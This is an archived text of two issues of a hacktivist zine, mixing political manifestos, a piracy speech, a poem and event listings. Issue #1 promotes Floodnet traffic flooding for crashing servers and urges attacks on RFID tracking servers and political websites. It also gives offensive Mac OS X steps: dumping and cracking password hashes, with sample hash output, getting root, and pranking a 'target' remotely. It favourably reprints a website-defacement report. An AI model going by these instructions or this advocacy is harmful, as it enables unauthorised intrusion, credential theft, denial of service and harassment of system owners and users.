applied its full judicial powers to obstruct, to punish, to harass the guilty
ones. 

 There is nothing new under the Sun. 

 Today we know that the only right thing to happen for the society to evolve was
to let the knowledge go free. We know now that Galileo Galilei was right. Even
if he had to puncture a monopoly of knowledge. 

 We are speaking here about the time when the Church went out in its full force
and ruled that it was unnecessary for its citizens to learn to read or to write,
because the priest could tell them anyway everything they needed to know. The
Church understood what it would mean for them to lose their control. 

 Then came the printing press. 

 Suddenly there was not only a source of knowledge to learn from, but a number
of them. The citizens, who at this time had started to learn to read, could take
their own part of the knowledge without being sanctioned. The Church went mad.
The royal houses went mad. The British Royal Court went as far as to make a law
that allowed the printing of books only to those print owners who had a special
license from the Royal Court. Only they were allowed to multiply knowledge and
culture to the citizens. 

 This law was called ""copyright"". 

 Then a couple of centuries passed, and we got the freedom of press. But
everywhere the same old model of communication was still being used: one person
talking to the many. And this fact was utilized by the State who introduced the
system of ""responsible publishers"". 

 The citizens could admittedly pick pieces of knowledge to themselves, but there
always had to be somebody who could be made responsible if, what a horrible
thought, somebody happened to pick up a piece of wrong knowledge. 

 And this very thing is undergoing a fundamental change today - because the
Internet does not follow the old model anymore. We not only download culture and
knowledge. We upload it to others at the same time. We share files. The
knowledge and the culture have amazingly lost their central point of control. 

 And as this is the central point of my speech, let me lay it out in some
detail. 

 Downloading is the old mass media model where there is a central point of
control, a point with a 'responsible publisher', somebody who can be brought to
court, forced to pay and so on. A central point of control from where everybody
can download knowledge and culture, a central point that can grant rights and
take them away as needed and as wanted. 

 Culture and knowledge monopoly. Control. 

 Filesharing involves simultaneous uploading and downloading by every connected
person. There is no central point of control at all; instead we have a situation
where the culture and the information flow organically between millions of
different people. 

 Something totally different, something totally new in the history of human
communications. There is no more a person that can be made responsible if wrong
knowledge happens to spread. 

 This is the reason why the media corporations talk so much about 'legal
downloading'. Legal. Downloading. It is because they want to make it the only
legal way of things for people to pick up items from a central point that is
under their control. Downloading, not filesharing. 

 And this is precisely why we will change those laws. 

 During the passed week we have seen how far an acting party is prepared to go
to prevent the loss of his control. We saw the Constitution itself being
violated. We saw what sort of methods of force and attacks on personal integrity
the police is prepared to apply, not to fight crime, but in an obvious intention
to harass those involved and those who have been close to them. 

 There is nothing new under the Sun, and the history always repeats itself. This
is not about a group of professionals getting paid. This is about control over
culture and knowledge. Because whoever controls them, controls the world. 

 The media industry has tried to make us feel shame, to say that what we are
doing is illegal, that we are pirates. They try to roll a stone over us. Take a
look around today, see how they have failed. Yes, we are pirates. But whoever
believes that it is shameful to be a pirate, has got it wrong. It is something
we are proud of. 

 That is because we have already seen what it means to be without central
control. We have already tasted, felt and smelled the freedom of being without a
top-down controlled monopoly of culture and knowledge. We have already learned
how to read and how to write. 

 And we do not intend to forget how to read and how to write, even if
yesterday's media interests do not find it acceptable. 

 MY NAME IS RICKARD, AND I AM A PIRATE!
 
################################################################################
#                       I played Urban Capture the Flag                        #
################################################################################
 
 chicago urban capture the flag meets on the second saturday of every month at
6pm in wicker park - milwaukee north and damen off the damen blue line
 
What did you do last night?

I can tell you what I did.

I played Urban Capture the Flag,
mother fucker.

I saw signs and posters
and little handbills all over
Wicker Park for the past couple weeks.

""Reclaim the City""
""play Urban Capture the Flag""

with a map,
a city grid,
almost a square mile,
separated by a great dividing
line known as Milwaukee avenue.

And, an awesome little drawing
of a dude with a beard running with a flag.

It said to show up at the Damen
Blue Line train stop at 7 pm.

I did.

I had nothing else to do.

It's strange,
these days,
when I don't have a gig
on a weekend,
I never really have anything to do.

So I show up for summer camp
games in cold weather and light rain.

there, at the train stop,
I met 30 perfect strangers.

we divided into two perfect teams.

They were mostly strangers
to eachother, a few pockets
of friends here and there,
but mostly just the bored,
curious, and adventurous
type who would show up
for such an event.

Wide demographic,
punks and yuppies
and thirty-somethings
and a gay guy, and a tall
Jesus looking character,
and a girl who told me she finds
perfectly good bagels in the dumpster.

We got little bandanas to distinguish teams,
and we hid our flags and planned our strategy.

and we were off.

And I felt like I was in Die-Hard
and the Bourne-Identity for the next three hours.

It was awesome.

We snuck around the city,
in two and threes,
and solo advances.

Once we crossed into enemy
territory, we were vulnerable
to capture and imprisonment.

But we were not alone in the streets,
it was Wicker Park on a Saturday night,
we could try to blend in,
always looking out for a bastard
with a white bandana.

And if you saw one,
you ran.

I ran like I haven't run
since I was fourteen.

running for my life,
as if nothing else mattered
in the world except to get
back over Milwaukee Avenue.

When was the last time you
did a full on sprint until you just
couldn't run anymore?

For me, its been a while.

I don't find myself sprinting
so often these days.

but last night,
I ran like the wind,
until the wind was completely
out of my body and spilled
all over the streets.

Today, I am sore,
but I am also grateful
for such an evening of unexpected fun.

I met people I would never ordinarily meet.

I learned that you can find perfectly good bagels
in the right dumpsters.

I smoked a bowl with the leaders of the event,
a pair of twin activists.

Man, are they interesting cats.

they do stuff,
anything, they just
seem to want to take action,
be heard, have fun,
get noticed, make a statement,
have other people wonder about them
instead of wondering about a TV
full of artificially sweetened famous people.

Last night,
they chose Capture the flag.
and it was quite a success.

3 hours long,
30+ strangers showing up
on a cold, wet night.

They have my email address,
and I'm going to show up
at whatever they do next.

Now if you'll excuse me,
I have to write a theme song
for the Rat Patrol.

those are the guys who
ride around Chicago on
those big, tall, crazy bikes.

I met a few last night,
and they need a theme song.

################################################################################
#                                   CREDITS                                    #
################################################################################
                                   
               ** HACK THIS ZINE #4: AMMO FOR THE INFO-WARRIOR **               

We are an independent collective of creative hackers, crackers, artists and
anarchists. We gather to share skills and work together on several projects to
teach and mobilize people about vulnerability research, practical anarchy, and
how free technology can build a free society. We are an open, free flowing, and
ever changing collective which generally works on IRC. Everyone is encouraged to
explore and contribute to the group and it's related projects.

                              Network of Projects                               
--------------------------------------------------------------------------------

hackthissite.org
Hack this site is a free and legal training ground that allows people to test
their security skills against a series of realistic hacking challenges. we
provide a friendly environment for people to get involved with programming and
internet security by collaborating with other coders and hackers.

hackbloc.org
Hackblocs are local groups and gatherings where hackers and activists gather to
discuss, share skills, and collaborate on projects related to free technology,
open source, tech activism, and more. We work to defend a free internet and a
free society by mixing hacker and activist strategies to explore both defensive
and direct action hacktivism. Each local group is autonomous and together we
form a decentralized network to collaborate and coordinate actions in solidarity
with other social justice struggles around the world.

Current Collectives:
San Francisco Bay Area - http://www.hackbloc.org/sf/
Chicago - http://www.hackbloc.org/chicago/
Canada - http://www.hackbloc.org/ca/
UK - http://www.hackbloc.org/uk/
US-south http://hackbloc.org/south
Maine - see forums

hacktivist.net
A 'think tank' for hacktivist related activities: user submitted exploits,
images, and articles as well as resources on getting involved with hacker
activism.

disrespectcopyrights.net
An open collection of anti-copyright images, pdfs, texts, movies, music, and
more related to programming, hacking, zines, diy culture, and activism. the
system is integrated into a mediawiki site and also allows people to upload
files.  

                     We are many, they are few!

Zine staff: darkangel, nomenumbra, alxciada, br0kenkeychain, tonto, r0xes,
sally, wyrmkill
HTS Staff: iceshaman, custodis, scriptblue, outthere, mcaster, technoguyrob,
wells, 
Hackbloc/Hacktivist: flatline, alxciada, darkangel, wyrmkill, themightyowl,
hexbomber, blissi, whiteacid, sally, squee, ardeo, pacifico, Ln
Contributers: spydr, phate, moxie, scenestar, truth, leachim, kage, morklitu,
rugrat, ikari, s1d, skopii, bfamredux, kuroishi, wyrmkill, mochi, smarts, random
cola

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
################################################################################
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
                           --> Make Contact <--

            Project Organizer: Jeremy Hammond - whooka[at]gmail.com

                          --> Join us on IRC <--
                   irc.hackthissite.org SSL port 7000
                      #hackthissite #hackbloc #help

                      --> Visit Our Online Forums <--
                      http://www.criticalsecurity.net
                     or http://www.hackbloc.org/forums
 
                            --> Email Us <-- 
                 htsdevs@gmail.com    hackbloc@gmail.com

                     --> GET COPIES OF THE ZINE! <-- 
Electronic copies of the zine are available for free online at the hackbloc
website. We have produced two versions of the zine: a full color graphical PDF
version which is best for printing and also includes all sorts of extras, as
well as a raw TXT version for a more readable and compatible format.

Having the zine in your hands is still the best way to experience our zine. If
you can't print your own(double sided 8.5x11) then you can order copies of this
issue and all back isssues online at the nice fellows at Microcosm
Publishing(microcosmpublishing.com) who are based out of Portland. If you live
in Chicago, you can grab a copy at Quimbys Books or at the dai5ychain.net space
in Pilsen. Or just visit us at one of the many events Hackbloc can be found
locally, regionally, and nationally!

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
################################################################################
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

** DAI5YCHAIN.NET *
dai5ychain is a public-access computer lab and events platform located in
pilsen, chicago, in a former flower shop. the dai5ychain project operates as a
platform for new media performance and screening events devised and programmed
in response to a unique network architecture. it shares a building with the
Busker project initiated and programmed by tamas kemenczy and nicholas o'brien.
the dai5ychain project is developed and maintained by jake elliott, lynn hurley,
tamas kemenczy and others.

The hacklab project has from its inception included workshops and skill-sharing
sessions, and dai5ychain aims to enable these vital activites as well. members
of the local software development and new media arts community will be contacted
and asked to provide workshops, and the space will also be open and very
receptive to proposals of this nature.

dai5ychain aims to provide a variety of technical resources, and is specifically
interested in the following:
01 : open_platforms -- open source/hackable/extensible software systems;
examples: linux, pureData, superCollider
02 : obsolescent_kit -- 'obsolete' and otherwise antiquated and therefore
commercially inaccessible hardware and software platforms for artmaking;
examples: commodore64, dumb terminals, dot-matrix printers, vectrex

 the space is open daily from 12pm->5pm for general access and hosts one-off and
recurrent events in the late evening. access to dai5ychain outside of these
scheduled times may be requested via a form on the website and is encouraged and
enabled whenever possible. 
 

** CHICAGO SOFTWARE FREEDOM DAY : SEPT 16 **
Calling all free-wheeling free-information free-reproductionistas! Attention to
the hackers who love the streets! For the activists  that just want to share
resources! And for the militant media makers in search of free and open access
to knowledge and ideas.

Sept 15 2006    Location TBA Chicago, IL USA

Intellectual Property Regimes and Alternatives
Low Power Radio FM
Internet Law for Activists
Public Space
Non Profit

This event will gather some of the regions most committed activist programmers,
free software lovers, socially engaged artists, independent media makers and
critical thinkers to brainstorm and develop an agenda for the technological
support of radical social movements in the great lakes region.

http://www.dai5ychain.net
http://hackmeetingwiki.dai5ychain.net
http://chicagolug.org/lists/listinfo/chicago-hacktavism
http://www.freegeekchicago.com                          
http://www.hackbloc.org/chicago

!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
When I was a kid, hackers were criminals. Hackers were dreamers who saw through
this world and its oppressive institutions. Hackers were brilliant maniacs who
defined themselves against a system of capitalist relations, and lived their
lives in opposition. Every aspect of the hacker's life was a tension towards
freedom -- from creating communities that shared information freely, to using
that information in a way that would strike out against this stifiling world.
When nobody understood how technology worked in the systems that surrounded us,
hackers figured those systems out and exploited them to our advantage. Hackers
were criminals, yes, but their crimes were defined by the laws of the
institutions that they sought to destroy. While they were consistently portrayed
as criminals by those institutions, their true crimes were only those of
curiousity, freedom, and the strength to dream of a better world.

Somewhere along the way the ruling class started paying hackers to defend the
very systems that they had so passionately attacked. Originally we took these
jobs while smiling out of the corners of our mouths, thinking that we were only
tricking those in control. But at some point we tricked ourselves. Where power
does not break you, it seduces you - and seduced by the siren song of commodity
relations, we lost sight of our dreams and desires. Instead of striking out to
create a new world, we found ourselves writing facial reconition software that
sought to preserve this one at all costs.

Today, the attempts at revival of hacker culture make hackers nothing more than
mere hobbyists. We pat ourselves on the back and smile about how we're really
hackers again, that we've gotten back to tinkering, that we're doing interesting
things with LEDs once more. But this tinkering is only the shadow of its former
self. Asking for the right to modify a commodity that has been sold to us does
not challenge anything. These projects only help to create bigger cages or
longer leashes, recuperating our desires and satisfying our sense of ingenuity
by putting wall paper on this ugly world.

But some of us still wipe our asses with white papers and dream dangerously. If
you're not satisfied with people modifying their SUVs and being called hackers,
look around, find those of us who aren't either, and hack the planet.
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
Papers,HackThisZine (HTZ) #1,eZine,,2006-06-21,: N/A,"Hack This Zine! Summer 2004
electronic civil disobedience journal

DISTRIBUTE ME WILDLY!
This community publication is entirely free to own and free to share. We
only can afford to publish a limited amount of copies. We count on people
to pass the zine on to friends, local computer stores, hacker groups, 2600
meetings, libraries, bookstores, newstands, etc. Remember, you’re a part of
this movement - help spread the word!

HOW TO GET ADDITIONAL COPIES
Copies are available from Unbound Books internet/mail order distribution:
$5 for one zine. Check unboundbooks.org for ordering information. Special
bulk pricing is also available for all who want to help distribute the zine.
Email webmaster@hulla-balloo.com for custom pricing, please describe
your intent, area of distribution, and desired quantity. International orders,
check the zine website for local contacts who can ship to your area.
Please include your address, comments, and cash/money order to cover
production / postage costs. Or you can paypal us at webmaster@hulla-balloo.
com. More details, check out: http://www.hackthissite.org/zine/

GET INVOLVED WITH HACK THIS SITE!
WWW: http://www.hackthissite.org
CHAT(IRC): irc.hackthissite.org / irc.mattburdine.com #hackthissite
Use a web-based java irc client at hackthissite.org/irc/
Email(can’t always respond - but we do read!)
zine@hackthissite.org - zine related concerns
hack@hackthissite.org - site / organization related
webmaster@hulla-balloo.com - criminal mastermind
Meetings are held in IRC every few weeks

PARTICIPANTS

HTS STAFF:
Xec96
ReDucTor
DarkOneWithANeed
spiffomatic64
The_Anarchist
Sanjuro
OutThere
Darksider
kleinnico
SavageTiger
weekend hacker
soulsyphon
IceShaman
blakhawkftp
Shox2daShox
BIG
ikari
WolfSage
mraellis
psyche
MrBrett
Wyrmkill
bigpy2003
buz

ZINE TEAM:
Xec96
Pantalaimon996
blakhawkftp19
Daemon13

SUBMISSIONS
DragonMaw
RaH
Xec96
psyche
Fetus
Trojan
plastek
ikari
ReDucTor

EDITING
Fetus
arun
Peter Wortz
caliginouschild


ELECTRONIC COPIES OF
HACK THIS ZINE
While we charge for physical copies
of the zine to cover production costs,
we believe that all information should
be free. Electronic copies of HTZ are
available in PDF and TXT form online.
Please distribute wildly to friends, local
computer and hacker user groups,
libraries, bookstores, etc.

hackthissite.org/zine/HTZ1.txt
hackthissite.org/zine/HTZ1.pdf

HTZ OPEN SUBMISSIONS!
Hack This Zine is open to all submissions
of any sort - articles, pictures,
cartoons, hacks, ideas, whatever you
think would be appropriate. We cannot
publish everything but we certainly look
everything over. If you get something
printed, we’ll send you a free zine! Send
everything to zine@hackthissite.org.

HACK THIS SITE
COLLECTIVE
HTS is a volunteer project run by the
Hack This Site collective. We operate
using a directly democratic decision
making process without any authoritative
hierarchy. We engage in open
meetings over IRC where all users are
invited to participate.
For more information about how this
project is structured, please see the
HTS Project Organizing Guide at:

hackthissite.org/info/organize.php
hackthissite.org/info/organize.pdf

Hack This Zine?

Most people familiar with Hack This Site might be a
bit confused. A magazine? I thought HTS was about
wargames and security challenges. Yes, but over the
past year we’ve experienced so much more with the development
of the IRC server, user-submitted articles and
resources, forums, and the internal staff structure. We’ve
become a living community with many on-going projects
managed by active users sharing their experiences with
others. It has become necessary to begin publishing a
magazine to explore the hacking scene. The movement
we were building has more social signifi cance than a
mere training ground.

Activism? I thought this was a hacking zine...

Purely hacker zines have been done to death thousands
of times, never making any impact in the status
quo by shaping culture or politics. Instead of reinventing
the wheel and competing with other larger distros by
merely keeping up with the latest tech news, we’re going
to be discussing the practical usage of hacking skills as
a means to fi ght for social justice. Considering today’s
political climate, it is becoming increasingly imperative
that we tune in to the world around us, to take a stance,
and give a fuck.

It is foolish and destructive to expand one’s hacking skills
without the development of social awareness, knowledge
of current events, and political ideology. Our intention is
not merely to raise technical consciousness, but social
and political as well. We intend to keep up with the latest
hacktivist news - updates on electronic civil disobedience
campaigns, the latest threats of cyber tyranny against
our civil rights, and ways people can get involved in the
digital freedom movement.

The New World Order

Nonstop cycles of fear, consumption and wage-slavery.
We are pumped full of fear-mongering propaganda so
that we willingly submit ourselves to the State’s oppression
- giving them free reign to systematically destroy
our freedoms and bring about a new age of big brother
well beyond the imagination of George Orwell. Initiatives
like Total Information Awareness, the USA PATRIOT Act,
Operation TIPS, email monitoring systems, the Offi ce of
Homeland Security, RFID product codes, and the continuous
attempts to tap and monitor all mediums of communication
make it clear of the establishment’s intent to
transform our society into one where our every thought
and movement is closely monitored and calculated to
see whether we are a threat to their cold, sterile dream
of law and order.

There’s a fucking war on!
We are kept under tight control and surveillance so that
the military industrial complex can continue to manufacture
bullshit pretexts for fake wars all for the profi t of the
rich ruling classes The Bush administration has made a
killing in privatizing Iraq’s oil resources(Halliburton), reconstruction
efforts(Bechtel), and otherwise allowing his
corporate buddies to loot Iraq for all it’s worth. For weapons
of mass deception and no ties to Al-Qaeda or 9/11.
Are we any safer from terrorist attacks? Every friend and
family member of the tens of thousands of innocent civilians
that died in Iraq are now looking at ways of getting
back at the U.S. The utter hypocrisy of the war on terror...
we have killed several times more people that have died
on 9/11. Pre-emptive war is state-sponsored terrorism.
Carpet bombing cannot address the complex social and
political factors that actually create anti-american terrorism
- in fact, it feeds it.

We are building an international movement to defend the
rights of all people to self-determination from the ruling
classes of nations worldwide. We want neither Bush,
nor Saddam, nor Blair. Together we can organize in an
open and equal basis and build our own societies free of
authoritative power structures and parasitic bosses and
rulers.

The Digital Freedom Movement
While the madness of the State is spiralling towards self
destruction, we’ve built our own communities based on
the open spirit of free access to all information. Open
source programming has successfully developed some
of the best softwares, operating systems, and mediums
of communication - all free to own and free to share, independent
of authoritative power structures. It is a practical
application of anarchist organizing principles.

It is of little surprise that our movement is under attack
by large capitalists like Microsoft, SCO, and the record
industry. Because our software is free to own and free
to share, their monopoly over computing and media industries
is threatened because they cannot compete with
their bloated, obsolete and expensive systems. Rather
than finding ways of integrating these fantastic services
into our society, corporations will go to any length to cling
to their outdated models of profit and exploitation. We
need to directly to the heart of the matter: we are under
attack, and we have to equip ourselves to fight back.

It’s one attack, one struggle.
All of these injustices are not unrelated. These struggles
are linked, and everything is connected. It’s the system!
From the presidents that bring the people to war, to the
cops that beat protesters, to the bully on the playground
stealing lunch money, it is becoming glaringly obvious
that we cannot trust figures of authority. It’s up to us to
organize on a cooperative, anti-authoritarian basis and
build our own free societies on the ashes of the old.

We don’t have a lot of time left. Whether it be the madness
of the warring nations, or the destruction of the environment,
or the depletion of natural resources... we are
simply consuming, reproducing, and expanding too fast
for our finite ecosystem to support us. Every species has
a carrying capacity. We are rapidly approaching ours.

This isn’t a call for pessimism, but rather the fantastic
potential that we have the ability to create dissent, rise
up and put direct pressure on those responsible for this
madness. Now that everything depends on complex networks
of communication and the internet, hackers are
in a unique position to mobilize their skills to fight for
change.

Hacking as a tool to fight for social justice?
The practical application of hacking skills to fight for freedom
is a beautiful act of justice and liberation. If the Nazi
military utilized computer networks to coordinate troop
movements, hackers could have thrown their war machine
into disarray. If corporations and governments are
out of line today, it’s up to cowboys of the electronic age
to turn over the system and put the people on top. Electronic
civil disobedience, modern day Robin Hood, cyber
activism, hacktivists!

Circumvent corporate media - Do It Yourself!
The forces that be are allowed to get away with murder
because they own most channels of communication. The
Clearchannel Coporation owns 1225 radio stations and
37 television stations. They are in the top 248 of the top
250 radio markets. Television, news and radio networks
are largely dominated if not monopolized by these large
corporations who have vested financial interests in supporting
government, war, and international neo-liberal
trade organizations. They fill us with their lies and distortions
and turn us into unthinking, unquestioning followers
of the establishment. Even in this age of internet enlightenment,
hackers are portrayed as cyberterrorists.

At the center of Hack This Site is the drive to DO IT
YOURSELF! Turn off that television, unplug yourself
from their system, and make your own media! Underground
literature will not sugar coat the news fit for your
unthinking consumption - we tell the uncensored truth,
explore controversy, create a platform for the free exchange
of ideas, and don’t patronize our readers by
sugar coating raw information.

Hack This Site!
Hack This Site is a training ground for people to gain
the skills and join the movement for digital freedom. We
facilitate a free, open learning environment where hackers
can test and expand their skills in a realistic and
legal environment Everyone should have access to all
information, resources, and the opportunity to fulfill one’s
potentials. Of course, providing such resources requires
great responsibility to see that these skills are used for
positive ends. We present the usage of hacking skills as
a means to fight for social justice as a positive alternative
to mindless destructive black hatting. We’re building an
army so powerful we won’t need weapons. Our revolution
will require not bullets or casualties, but the curious
drive of a politically motivated generation of hackers who
know how to shift data around in the right direction.
Hackivists of the World, UNITE!


Floodnet: Power to the People! by Trojan

In our modern age of internet enlightenment, new
and innovative forms of protest are emerging
on the web. One tool spearheading the protest
movement is Floodnet. Floodnet is a java applet
refreshing a selected page every seven seconds.
Alone this have no real purpose, but when hundreds
or even thousands of floodnet users connect
to a page, the surge in traffic easily can crash
a server. Many Major attacks have already been
utilized including one on the Pentagon.

The program is genius in its simplicity. This strikes
fear into the hearts of companies. The idea that
thousands across the world can easily be armed
for virtual warfare strikes a deep chord within
them.

“Strength in numbers” as they say. I was recently
told of one account in which the eCommerce site
“Etoys” sued a smaller website, and floodnet community
member “Etoy”, claiming that etoy simply
desired traffic from typos of the word “Etoys.com”.
The members of the Electronic Disturbance Theatre
(The Originators of Floodnet) threatened to
hold a “Twelve days of Christmas” strike to bring
etoys stock to zero. Needless to say, etoys backed
down, and even payed for etoy’s court costs.

What could be scarier to a company? They may
be used to having people hate them, but the
idea of thousands that can strike back? So much
power in the hands of the commoners? Floodnet
allows for this.

“Only art history still knows that the famed geniuses
of the Renaissance did not just create
paintings and buildings, but calculated fortresses
and constructed war machines. If the phantasm of
all Information Warfare, to reduce war to software
and its forms of death to operating system crashes,
were to come true, lonesome hackers would
take the place of the historic artist-engineers.” -
Frederich Kittler

Strength in numbers indeed.

MORE ON ELECTRONIC CIVIL DISOBEDIENCE:

Electronic Disturbance Theatre
thing.net/~rdom/ecd/ZapTact.html

Electro Hippie Collective
fraw.org.uk/ehippies/tools.shtml

The Hacktivist
http://www.thehacktivist.com/

The Federation of Random Action
http://www.this.is/etoytech/fra/


Electronic Product Code / RFID:
New meaning to Big Brother

Attacks on civil liberties and the Orwellian transformation
of our country are not new concepts to
those who have not been living under a rock for
the past few years. We have legislation like the
USA PATRIOT Act that gives unprecedented police
state powers to law enforcement and government.
We have government spy agencies such as Total
Information Awareness (now named ‘terrorist information
awareness’) that watches our credit card
purchases, what library books we check out, websites
we visited, and where we travel. The Office of
Homeland Security, Carnivore, Echelon, Operation
TIPS, etc. But many people are relatively unaware
of a new technology that when introduced to the
mainstream will set new precendents to the survellience
powers of corporations and governments.

Over the next few years, the old UPC barcodes of
times past will be replaced by the new Electronic
Product Code (EPC). This new system implements
a technology known as Radio Frequency Identification
(RFID). They are mini chips that transmit radio
waves that contain unique identifying information.
These transmissions are picked up by nearby base
stations which logs the time and location. Unlike
the UPC, these new EPC chips contain a unique
code for each individual instance of a product instead
of just what type of product. This means they
will be able to track where your individual product
is at any time.

The EPC will make its appearance in the mainstream
quicker then you might imagine. By 2005,
every product sold at Walmart will contain these
RFID tracking chips. Some corporations are already
using these chips(Gilette). Eventually, the
UPC will be phased out completely and most consumer
products will carry these chips. On your
watch, your shoes, your and you won’t be able to
buy something more expensive than a snickers bar
that doesn’t have an EPC chip. The European Union is
even considering using this chips on cash (removing the
anonymous quality desired by undergrond revolutionary
hackers who do not trust the banks and credit card 
corporations - and rightfully so!)

Corporations say that these chips will be used to
gather marketing information by monitoring what
stores you shop at, where you live, and to prevent
shoplifters. There is no current legislation about the
placement of these chips or it’s use - products containing
RFID do not need to be marked or disabled
as they leave the store.

It is not hard to understand the immense threat to
our civil liberties that this new technology presents.
Since they are already able to connect purchased
products to the credit card information in your
name, there is no end to the amount of information
they will have. We are not far off from a world
where we can be tracked wherever we go from
little chips embedded into our clothes, shoes, and
watches. A world where governments and corporations
know what shops we visit, what products we
have in our homes, and what we’re carrying on us
at any given time. It sounds surreal, but these are
crazy times...

The RFID chips themselves can be disabled rather
easily - but their strength is in their relatively inexpensive
price to produce and the ability for these
chips to be rather obscurely hidden within consumer
products. What needs to be explored is the
servers and data capturing networks that log the
movement of these chips. Such systems would
be very attractive targets for hackers fighting cyber
tyranny. Also, there needs to be new devices
that can produce a counter effect to the RFID chip.
It is up to the us, the people, to counteract these
malcious intrusions. This will become increasingly
imperative as years pass by and RFID becomes
tightly intertwined with American consumer culture:
where we will not be able to live our lives without
these chips watching our every move.

More reading about RFID / EPC:
http://news.com.com/2010-1069-980325.html
http://www.spychips.com
http://www.caspian.com


Hack This Zine summer release

Our first hacktivist magazine is published! 24 pages
of the latest updates in electronic civil disobedience
campaigns, exploits, activism, and more.
Available in PDF, TXT, HTML and in print by mail
via Unbound Books distribution collective. We
are launching an international campaign of distribution:
people are encouraged to distribute as
many copies as widely as possible to local libraries,
hacker meetings, infoshops, computer user
groups, etc. We are looking for people to help redistribute
copies in their

HOPE Hacker Convention
Jule 9-11 | NYC | the-fifth-hope.org

DEFCON 12 Hacker Convention
July 31-Aug 1 | Las Vegas | defcon.org

DNSCon network security council
August 13-15 | Blackpool, UK / dnscon.org

HTS is planning on having a presence at the
DEFCON 12 / HOPE / DNSCON hacker conventions.
We’re setting up a booth to distribute HTS
pamphlets, sell copies of the zine, and set up
systems where people can play the challenges.
All are invited to come chill with the developers
of HTS. We are also planning on getting a hotel
room where we can get together as many HTS
people as possible to go on all sorts of crazy adventures.

CrimethInc National Convergence
Aug 20-Aug 26 | Des Moines, Iowa | crimethinc.com | 
bestplaceever.com/crimethinc/

All are invited for a weeklong anarchist training
session. There will be radical video showings,
direct action training, organizing workshops as
well as other mischief and mayhem. Immediately
afterwards all will be travelling to particpate in the
actions against the Republican National Convention
in NYC.

Republican National Convention

Aug 29-Sept 4 | NYC | rncnotwelcome.org
The RNC is being held in New York City in an attempt
to capitalize off of the fears and emotions
surrounding the 9/11 terrorist attacks. George W.
Bush will be nominated as the presidential candidate
of the Republican Party. Hundreds of thousands
will descend upon the city to see that the
event ends in total failure. Groups are also organizing
an electronic civil disobedience campaign
against a variety of right-wing and corporate websites.
All are encouraged to help protest in any
way they can.


Fundamentals of Mac OS X Security

Hardly considered hacking at all, these tips are
required security basics when using Mac OS X.

If you have access to the command line in Mac
OS X under any user, you can get NetInfo to dump
passwd information to stdout with the following
command: ‘nidump passwd .’ DES-encrypted
passwords are dumped to stdout. You can run this
through any standard UNIX password cracker like
John The Ripper(also available for Mac OS X at
openwall.com/john).

Another way of gaining root is to sudo su root
it - allowing you access to a root prompt only by
knowing an administrator account(which can be
retreived through nidump). You can also reset the
administrator password by booting from a Mac
OS X install cd.

If you have physical access to the machine, try
restarting and holding Command + S - this will
boot into ‘Single User Mode’, which is essentially
a root shell. Note that you will not be able to dump
the passwd database until you load the NetInfo
Database, which you can do so by runnng /sbin/
SystemStarter.

If you’ve got shell access, there’s all sorts of fun
things you can do. Personally, I like Mac OS X’s
built-in speech engine used in conjunction with
osascript, a command line AppleScript interpreter.
Try executing this:

[local:~] xec96% osascript -e ‘say “you are being
watched”’

Assuming they have the volume turned up at a
reasonable volume(you can set system volume
by doing XXXXXXX), this will cause their computer
to physically speak the given parameter. This
can provide an endless supply of amusement, especially
if you are near enough as to hear the target
have entire conversations with their machine.
Since you have access to AppleScript’s entire array
of neato system functions, there are other fun
things to do as well.

• Open browser to a specified website
[local:~] xec96% osascript -e ‘open location
“http://www.larrycarlson.com/the_end”’
• Control iTunes and play music
[local:~] xec96% osascript -e ‘tell application
“iTunes”’ -e ‘next track’ -e “end tell” (also in place
of ‘next track’, try ‘previous track’, ‘pause’, ‘play’,
and ‘open “Macintosh HD:something.mp3”’)
• Open all apps at once(essentially freezing)
[local:~] xec96% open /applications/*
Fundamentals of Mac OS X Security

[local:~] xec96% nidump passwd .
root:gRhAAGQx4AoKk:0:0::0:0:System Administrator:/var/root:/bin/tcsh
xec96:Kh79zSBCAZos6:501:20::0:0:Jeremy Hammond:/Users/xec96:/bin/tcsh


Hacktivists Deface DARE.com in Act of Electronic Civil Disobedience
republished from http://la.indymedia.org/news/2004/02/104143.php

Hackers have targeted DARE.com in political protest
of the criminalization of marijuana, the hypocrisy of
the war on drugs, and the indoctrination of today’s
youth through the DARE program.

“The establishment continues to ignore the positive
psychological benefits of mind altering chemicals
are used responsibly for the personal exploration of
consciousness. Marijuana, both harmless to society
and ourselves, is not the problem. Marijuana laws
are the problem. Millions of innocent people are
unjustly imprisoned while corporate criminals and
war mongers are trusted to the highest positions of
our government.”

The website was defaced on Feb 29, 2004 with
pro-legalization messages, criticisms of the
DARE program, justifications for electronic civil
disobedience, and links to dozens of websites where
people can learn about the legalization movement,
mind-expanding chemicals, political activism, and
more.

The hackers have done no permanent damage to
the systems, or released any sort of confidential
data - in fact, the hackers actually fixed the security
holes to combat the media stereotype that hackers
are malicious and destructive with a loose sense of
social ethics.

“We aren’t malicious, destructive, or have a loose
sense of ethics like the government, corporate media,
or right-wing maniacs would like to spin it. Those who
open-minded and curious enough to do the research
and actually try to understand us will realize that we
have a highly refined sense of social ethics, more
than the machinery of the state will ever have.”

The hackers have also posted a flyer to help build for
the demonstrations against the Republican National
Convention on August 29. rncnotwelcome.org
Hacktivists Deface DARE.com in Act of Electronic Civil Disobedience
republished from http://la.indymedia.org/news/2004/02/104143.php

Note from HTS staff: we are not defending the actions of the 
actions of the hackers who attacked DARE.com, but it is a 
welcome change of pace to see a defacement that actually 
made serious political points without causing any damage. 
This is why we chose to feature this defacement in our zine. 
All too often hackers step up on the soapbox and deface a 
major website and leave some lame message like ‘I h4x0r3d 
j00! c0nik was here - get more secure!’ If you are going to 
take the time and risk breaking the law, then at least have 
something significant to say.


Miami Police Riot as the
Rich Hide Behind Fences

